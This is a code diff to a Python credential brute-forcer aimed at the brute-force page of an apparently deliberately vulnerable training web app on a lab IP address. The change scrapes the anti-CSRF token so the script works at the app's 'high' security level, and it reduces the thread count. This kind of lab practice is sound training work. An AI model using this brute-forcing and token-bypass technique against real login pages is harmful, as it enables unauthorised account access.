@@ -6,8 +6,8 @@ from termcolor import cprint
 from concurrent.futures import ThreadPoolExecutor
 
 
-# variables
-url = "10.10.172.154"
+
+url = "10.10.38.215"
 port = "80"
 userlist = "./usernames.txt"
 passwordlist = "./passlist.txt"
@@ -37,9 +37,8 @@ def get_session():
 def try_credentials(url, port, username, password, phpsessid):
     lock.acquire()
     sys.stdout.write("\rTry: user={} & password={}".format(username, password))
+    r = requests.get("http://{}:{}/vulnerabilities/brute/?username={}&password={}&Login=Login&user_token={}#".format(url, port, username, password, re.findall("'user_token' value='(.*)'", requests.get("http://{}:{}/vulnerabilities/brute/".format(url, port), cookies={'PHPSESSID': phpsessid, 'security': "high"}).text)[0]), cookies={'PHPSESSID': phpsessid, 'security': "high"})
     lock.release()
-    r = requests.get("http://{}:{}/vulnerabilities/brute/?username={}&password={}&Login=Login".format(url, port, username, password),
-                     cookies={'PHPSESSID': phpsessid, 'security': "low"})
     if error_message in r.text:
         return;
     lock.acquire()
@@ -49,7 +48,7 @@ def try_credentials(url, port, username, password, phpsessid):
 
 def main():
     phpsessid = get_session()
-    pool = ThreadPoolExecutor(max_workers=500)
+    pool = ThreadPoolExecutor(max_workers=10)
     for user in open(userlist, 'r'):
         for password in open(passwordlist, 'r'):
             USER, PASSWORD = user.replace("\n", ''), password.replace("\n", '')
